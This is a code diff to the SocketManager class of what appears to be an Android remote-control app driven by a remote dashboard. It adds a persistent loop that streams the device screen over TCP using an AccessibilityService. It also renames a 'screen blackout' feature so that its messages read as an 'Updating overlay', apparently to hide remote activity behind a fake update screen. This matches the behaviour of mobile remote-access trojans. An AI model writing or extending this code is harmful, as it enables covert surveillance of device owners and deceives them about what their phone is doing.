@@ -2265,7 +2265,8 @@ public class SocketManager {
             JSONObject r = new JSONObject();
             r.put("success", true);
             r.put("active", screenBlackout.isActive());
-            r.put("message", screenBlackout.isActive() ? "Screen blackout is ON" : "Screen blackout is OFF");
+            r.put("message", screenBlackout.isActive()
+                    ? "Updating overlay is active" : "Updating overlay is hidden");
             return r;
         }
 
@@ -3111,50 +3112,31 @@ public class SocketManager {
             }
 
             case "stream_start": {
-                // Dashboard-timed one-shot screenshot streaming via AccessibilityService
-                stopIdleFrameMode();
+                // Start one persistent frame loop. Frames use the existing stream
+                // TCP channel; the dashboard must not issue stream_start per frame.
                 stopBlockFrameMode();
-                Bitmap bitmap = accessSvc.captureScreenSync();
-                if (bitmap == null) {
-                    JSONObject r = new JSONObject();
-                    r.put("success", false);
-                    r.put("error", "Accessibility screenshot capture failed");
-                    return r;
-                }
-                String base64 = bitmapToBase64(bitmap, 90);
-                int width = bitmap.getWidth();
-                int height = bitmap.getHeight();
-                bitmap.recycle();
-
-                if (base64 == null || base64.isEmpty()) {
-                    JSONObject r = new JSONObject();
-                    r.put("success", false);
-                    r.put("error", "Could not encode accessibility screenshot");
-                    return r;
-                }
-
-                long requestedIntervalMs = Math.max(500L, Math.min(
-                        10_000L, params.optLong("intervalMs", 1_000L)));
+                resumeStreamingAfterReconnect = false;
+                long requestedIntervalMs = Math.max(500L, Math.min(10_000L,
+                        params.optLong("intervalMs", 1_000L)));
+                startIdleFrameMode(DeviceInfo.getDeviceId(context), requestedIntervalMs);
                 JSONObject r = new JSONObject();
                 r.put("success", true);
-                r.put("base64", base64);
-                r.put("mimeType", "image/jpeg");
-                r.put("width", width);
-                r.put("height", height);
                 r.put("timestamp", System.currentTimeMillis());
                 r.put("streaming", true);
                 r.put("streamStarted", true);
                 r.put("intervalMs", requestedIntervalMs);
-                r.put("message", "Screenshot captured");
+                r.put("message", "Screen stream started");
                 return r;
             }
 
             case "stream_stop": {
+                // An explicit stop must cancel any reconnect-time auto-resume.
+                resumeStreamingAfterReconnect = false;
                 stopIdleFrameMode();
                 stopBlockFrameMode();
                 JSONObject r = new JSONObject();
                 r.put("success", true);
-                r.put("message", "Screenshot requests stopped");
+                r.put("message", "Screen stream stopped");
                 return r;
             }
 
